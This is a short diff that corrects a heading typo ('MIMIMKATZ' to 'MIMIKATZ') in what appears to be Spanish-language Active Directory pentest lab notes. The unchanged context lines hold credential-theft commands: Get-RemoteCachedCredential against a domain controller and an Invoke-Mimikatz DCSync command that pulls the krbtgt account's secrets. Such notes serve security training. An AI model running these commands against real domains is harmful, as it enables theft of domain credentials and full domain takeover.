@@ -2830,7 +2830,7 @@ Get-RemoteCachedCredential -Computername dcorp-dc -Verbose
 
 
 
-## MIMIMKATZ  - COMANDOS
+## MIMIKATZ  - COMANDOS
 ##### MIMIKATZ - DCSYNC
 ```
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
